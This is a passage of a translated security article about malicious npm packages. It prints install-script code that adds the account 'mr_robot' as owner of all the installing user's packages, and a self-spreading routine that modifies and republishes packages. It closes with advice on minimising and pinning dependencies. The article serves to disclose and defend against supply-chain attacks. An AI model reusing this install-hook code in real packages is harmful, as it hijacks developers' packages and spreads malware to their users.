body</span></span></span><span class="hljs-function">) </span></span>{   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> $ = cheerio.load(body);   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> packages = $(<span class="hljs-string"><span class="hljs-string">'.collaborated-packages a'</span></span>).map(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">i, el</span></span></span><span class="hljs-function">) </span></span>{     <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>).text();   }).get();   cb(packages); }); } currentUser(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">user</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (user) {   getModulesOwned(user, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">modules</span></span></span><span class="hljs-function">) </span></span>{     modules.forEach(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">moduleName</span></span></span><span class="hljs-function">) </span></span>{       addOwner(moduleName, <span class="hljs-string"><span class="hljs-string">'mr_robot'</span></span>);     });   }); } });</code> </pre> <br>  First, the script uses the <code>npm whoami</code> to get the name of the current user.  He then searches for the <a href="https://www.npmjs.com/">npmjs.org</a> website <a href="https://www.npmjs.com/">for the</a> packages that belong to this user.  As a result, the script uses the <code>npm owner add</code> command to add <code>mr_robot</code> to the number of owners of all these packages. <br><br>  This author also published the following packages containing the same backdoor: <br><br><ul><li> <code>test-module-a</code> </li> <li> <code>pandora-doomsday</code> </li> </ul><br>  <b>Modification and publication of local packages</b> <br><br>  Another malicious script found by us contains code that, in many respects, is similar to what was in the <code>mr_robot</code> packages, however, there is another ace up its sleeve.  Instead of simply modifying the list of owners of the npm-packages, the <code>sdfjghlkfjdshlkjdhsfg</code> module demonstrates evidence of the possibility of infection and publication of local packages. <br><br>  The installation script <code>sdfjghlkfjdshlkjdhsfg</code> demonstrates this process by modifying and publishing itself: <br><br><pre> <code class="hljs coffeescript">function infectModule (moduleName) {       installModule(moduleName)       .<span class="hljs-keyword"><span class="hljs-keyword">then</span></span>(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> =&gt;</span></span> {               addScript(moduleName);               copyScript(moduleName);               <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> incrementPatchVersion(moduleName);       })       .<span class="hljs-keyword"><span class="hljs-keyword">then</span></span>(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> =&gt;</span></span> publishInfectedModule(moduleName))       .<span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> =&gt;</span></span> {}); } const MODULE_NAME = <span class="hljs-string"><span class="hljs-string">"sdfjghlkfjdshlkjdhsfg"</span></span>; infectModule(MODULE_NAME);</code> </pre> <br>  Full source can be found <a href="https://gist.github.com/jordan-wright/6dda2e4683ba3e99c8d56cd7173c9d1f">here</a> . <br><br>  Although we only have a package that proves the possibility of such an attack, the exact same approach can be easily used to attack local packages owned by the user who performs the installation. <br><br><h2>  <font color="#3AC1EF">Results</font> </h2><br>  It is important to note that the above is possible not only in the npm repository.  This is typical of most, if not all, package managers.  Managers allow those who write and publish packages to set commands invoked during package installation.  Perhaps for npm this problem is more noticeable due to the package dependency structure, which we talked about above. <br><br>  In addition to this, it is important to note that we face a problem that is very difficult to solve.  Static analysis of published npm-packages is a difficult task.  So complex that there are whole companies that do it. <br><br>  In addition, there are messages from the npm developers that make it possible to judge that efforts are being made to use various metrics aimed at preventing users from downloading malicious packages.  Take a look, for example, on <a href="https://twitter.com/maybekatz/status/892501201551368192">this chat</a> on Twitter. <br><br>  In the meantime, it is recommended to continue to be careful when adding dependencies to projects.  In addition to minimizing the number of dependencies, we recommend using strict versioning and integrity checking of all dependencies, which can be done using the built-in <a href="https://yarnpkg.com/en/">yarn</a> tools or the <code>npm shrinkwrap</code> .  This simple technique will give the developer confidence that the code that was used during the development will go into production. <br><br>  Dear readers!  Do you protect your systems and Node.js projects from malicious npm packages?  If so, please tell us how you do it. </div><p>Source: <a href="https://habr.com/ru/post/335602/">https://habr.com/ru/post/335602/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../335586/index.html">Visualization of Moscow Exchange data using InterSystems DeepSee</a></li>
<li><a href="../335588/index.html">Planetary landscape</a></li>
<li><a href="../335590/index.html">Social Organism - as a form of effective team interaction. Part 2</a></li>
<li><a href="../335592/index.html">Cisco Digital Network Architecture: Key Features of the New Platform</a></li>
<li><a href="../335600/index.html">Internet bicycles - how IT helps to lead a healthy lifestyle and reduce harmful emissions</a></li>
<li><a href="../335606/index.html">Useful books on the development of mobile games on Android and iOS</a></li>
<li><a href="../335608/index.html">In a section: the news aggregator on Android with backend. Configuration Management System (Puppet)</a></li>
<li><a href="../335610/index.html">World Machine + UE4: Full Workflow</a></li>
<li><a href="../335612/index.html">How to conduct a non-ideal interview of a tester and why there is no ideal</a></li>
<li><a href="../335614/index.html">Log it: the method of the logarithmic derivative in machine learning</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>